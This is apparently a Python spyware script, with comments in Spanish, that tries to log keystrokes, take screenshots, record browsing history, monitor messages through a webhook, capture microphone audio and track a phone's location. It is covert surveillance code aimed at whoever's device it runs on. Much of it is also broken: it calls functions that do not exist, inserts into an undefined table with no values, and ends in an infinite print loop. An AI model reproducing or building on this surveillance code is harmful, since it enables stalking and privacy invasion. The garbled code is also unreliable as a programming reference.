import keyboard, pyautogui, time
import os
import sqlite3
import pywhatkit
import pyaudio
import tkinter as tk
import geoip2
from datetime import datetime
from webhooks import Webhook, app
import asyncio
from fastapi import FastAPI


# Configuración inicial
db = sqlite3.connect("registro.db")
cursor = db.cursor()
cursor.execute("CREATE TABLE IF NOT EXISTS historial (url TEXT PRIMARY KEY, timestamp TEXT)")
db.commit()

# Variables de estado
last_time = time.time()
navigation_history = []

def capture_keyboard_events():
    global last_time
    while True:
        event = keyboard.event_info()
        if event.type == 'keydown' and event.key in ['Ctrl', 'Shift']:
            # Manejar teclas especiales
            pass
        elif event.type == 'keypress':
            current_time = time.time()
            duration = current_time - last_time
            last_time = current_time
            print(f"Tecla pressionada: {event.key}, Duración: {duration} segundos")

def capture_screen():
    screenshot = pyautogui.screenshot()
    timestamp = datetime.now().strftime("%Y-%m-%d_%H-%M-%S")
    screenshot.save(f"C:\\ Screen_{timestamp}.png")

app = FastAPI()
@app.get("/api/capturar_registro", asyncio=True)
async def api_capturar_registro(event):
    pyautogui.hotkey('Win', 'O', "C:\\Path\\a\\documento.txt")  # abre el documento
    capture_screen()
    # Others

# Monitorear mensajes y llamadas
webhook = Webhook("tu_webhook_url", "tu_webhook_key")

@webhook.on("message")
async def on_message(data):
    print(f"Message received: {data}")

# Capturar historial de navegación
def capture_social_media():
    pywhatkit.screenshot("C:\\App screening.png", fullpath=True)
    navigation_history.append({
        "url": "Ejemplo.com",
        "timestamp": datetime.now().strftime("%Y-%m-%d %H:%M:%S")
    })
    db.execute("INSERT OR IGNORE INTO navegacion (url, timestamp) VALUES (?, ?)")
    db.commit()

# Grabar audio/video
pyaudiograb = pyaudio.PyAudio()
stream = pyaudiograb.open(format=pyaudio.paInt16,
                          channels=1,
                          rate=44100,
                          input=True,
                          frames_per_buffer=1024)
def grabar_audio():
    pyaudiograb()

# Ubicación del teléfono
latitude = 40.7128  # Ejemplo de latitud
longitude = -74.0060  # Ejemplo de longitud

geoLite = geoip2()
geoLite.setCoordinates(latitude, longitude)
while True:
    print(f"Ubicación actual: {latitude}, {longitude}")